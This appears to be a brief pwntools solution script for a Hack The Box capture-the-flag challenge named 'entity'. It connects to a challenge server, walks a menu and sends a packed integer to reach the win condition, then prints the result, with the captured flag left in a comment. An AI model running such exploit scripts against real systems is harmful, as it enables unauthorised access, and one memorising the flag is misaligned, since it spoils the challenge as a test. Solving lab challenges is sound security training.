from pwn import *

#io = process('./entity')

ip, port = "165.22.115.189", 31099
io = remote(ip, port)

io.sendlineafter('>>', 'T')
io.sendlineafter('>>', 'S')
io.sendlineafter('>>', p64(13371337))
io.sendlineafter('>>', 'C')
print io.recvall()

#HTB{th3_3nt1ty_0f_htb00_i5_5t1ll_h3r3}
